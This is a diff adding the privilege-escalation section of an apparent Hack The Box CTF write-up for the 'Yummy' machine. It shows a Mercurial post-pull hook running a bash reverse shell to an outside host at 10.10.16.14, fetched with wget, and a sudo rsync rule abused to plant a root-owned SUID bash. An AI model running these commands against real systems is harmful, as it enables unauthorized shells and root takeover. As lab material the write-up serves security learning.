@@ -344,6 +344,88 @@ I ssh with qa with above pasword and found userflag in /home/qa/user.txt:
 
 ![SQL Injection](/static/writeups/HTB-S-VI/yummy/22.png)
 
-## Root Flag
+### shell as dev user:
 
-**To be updated...**
+As a qa user, i am able to use hg which is a distributed version control system similar to git.
+
+```
+sudo -l
+[sudo] password for qa:
+Matching Defaults entries for qa on localhost:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User qa may run the following commands on localhost:
+    (dev : dev) /usr/bin/hg pull /home/dev/app-production/
+```
+
+Both programs use `hooks` to trigger certain events after pulling,committing and updating. Using these `hooks` we can execute a `script` after `pull` is done. First a `.hgrc` config file is needed to perform a `hook`. Let’s use the `.hgrc` in `/home/qa/`.
+
+let's do these below thing in **/tmp** folder so that every user can see it
+
+first create shell.sh with this content and host via python server:
+
+```
+#!/bin/bash
+bash -i >& /dev/tcp/10.10.16.14/1234 0>&1
+```
+
+then go in **/tmp** and download it with wget
+
+back in qa home directory in .hgrc add this line:
+
+```
+[hooks]
+post-pull = /tmp/shell.sh`
+```
+
+```
+.hgrc file content
+```
+
+so now that is done, create .hg folder in **/tmp** directory give permission to it and copy **/home/qa/.hgrc/** to **/tmp/.hg/hgrc**. like:
+
+```
+mkdir .hg;chmod 777 .hg;cp /home/qa/.hgrc /tmp/.hg/hgrc
+```
+
+first setup netcat listener with specified port in shell.sh and then using dev user to use hg pull with:
+
+```
+sudo -u dev /usr/bin/hg pull /home/dev/app-production/
+```
+
+just like that, i got shell as dev user
+
+```
+dev@yummy:/tmp$ id
+id
+uid=1000(dev) gid=1000(dev) groups=1000(dev)
+```
+
+## Root Flag:
+
+just as **`www_data`** , using sudo -l, i can see that as a dev user i am able to use rsync as a root user:
+
+```
+sudo -l
+Matching Defaults entries for dev on localhost:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User dev may run the following commands on localhost:
+    (root : root) NOPASSWD: /usr/bin/rsync -a --exclude\=.hg /home/dev/app-production/* /opt/app/
+```
+
+`rsync` is a tool for Synchronizing files and directories between location. We can use `rsync` between `/app-production/` and `/opt/app` with `-a` which preserves permissions.
+
+Executing the command copies the files in `/app-production` to `/opt/app` but because of `-a` flag the owner of the files stays as `dev`.
+so, `--chown` flag can be used to change the owner to `root`. And if we set a `suid` for the file, we can execute the file with `root` privilege.
+
+Be sure to do it in one liner using:
+
+```
+cp /bin/bash app-production/bash;chmod u+s app-production/bash;sudo /usr/bin/rsync -a --exclude=.hg /home/dev/app-production/* --chown root:root /opt/app/;/opt/app/bash -p
+```
+
+![SQL Injection](/static/writeups/HTB-S-VI/yummy/23.png)
+
+cheers!!
